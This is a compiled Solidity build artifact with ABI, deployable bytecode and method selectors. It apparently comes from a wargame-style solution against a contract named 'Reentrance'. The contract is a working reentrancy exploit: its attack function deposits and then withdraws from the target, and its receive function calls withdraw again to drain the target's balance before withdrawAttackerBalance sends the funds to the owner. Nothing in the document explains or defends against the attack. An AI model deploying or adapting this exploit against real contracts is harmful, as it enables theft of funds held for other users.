{"abi":[{"type":"constructor","inputs":[{"name":"_reentranceAddress","type":"address","internalType":"address"}],"stateMutability":"nonpayable"},{"type":"receive","stateMutability":"payable"},{"type":"function","name":"attack","inputs":[],"outputs":[],"stateMutability":"payable"},{"type":"function","name":"owner","inputs":[],"outputs":[{"name":"","type":"address","internalType":"address"}],"stateMutability":"view"},{"type":"function","name":"reentranceContract","inputs":[],"outputs":[{"name":"","type":"address","internalType":"contract IReentrance"}],"stateMutability":"view"},{"type":"function","name":"withdrawAttackerBalance","inputs":[],"outputs":[],"stateMutability":"nonpayable"}],"bytecode":{"object":"0x608060405234801561001057600080fd5b506040516103be3803806103be8339818101604052602081101561003357600080fd5b5051600080546001600160a01b039092166001600160a01b031992831617905560018054909116331790556103518061006d6000396000f3fe6080604052600436106100435760003560e01c80632e14fdb7146101685780634959aca21461017d5780638da5cb5b146101ae5780639e5faafc146101c357610163565b36610163576000546001600160a01b0316311561016157600054604080517f70a0823100000000000000000000000000000000000000000000000000000000815230600482015290516001600160a01b0390921691632e1a7d4d9183916370a0823191602480820192602092909190829003018186803b1580156100c657600080fd5b505afa1580156100da573d6000803e3d6000fd5b505050506040513d60208110156100f057600080fd5b5051604080517fffffffff0000000000000000000000000000000000000000000000000000000060e085901b168152600481019290925251602480830192600092919082900301818387803b15801561014857600080fd5b505af115801561015c573d6000803e3d6000fd5b505050505b005b600080fd5b34801561017457600080fd5b506101616101cb565b34801561018957600080fd5b50610192610207565b604080516001600160a01b039092168252519081900360200190f35b3480156101ba57600080fd5b50610192610216565b610161610225565b6001546040516001600160a01b03909116904780156108fc02916000818181858888f19350505050158015610204573d6000803e3d6000fd5b50565b6000546001600160a01b031681565b6001546001600160a01b031681565b60008054604080517e362a9500000000000000000000000000000000000000000000000000000000815230600482015290516001600160a01b039092169262362a95923492602480820193929182900301818588803b15801561028757600080fd5b505af115801561029b573d6000803e3d6000fd5b505060008054604080517f2e1a7d4d00000000000000000000000000000000000000000000000000000000815234600482015290516001600160a01b039092169550632e1a7d4d9450602480820194509082900301818387803b15801561030157600080fd5b505af1158015610315573d6000803e3d6000fd5b5050505056fea264697066735822122086553430e5a75f758106d6aa0a7239b603926776bd6be706857041f2189fd9ee64736f6c634300060c0033","linkReferences":{}},"methodIdentifiers":{"attack()":"9e5faafc","owner()":"8da5cb5b","reentranceContract()":"4959aca2","withdrawAttackerBalance()":"2e14fdb7"},"id":0}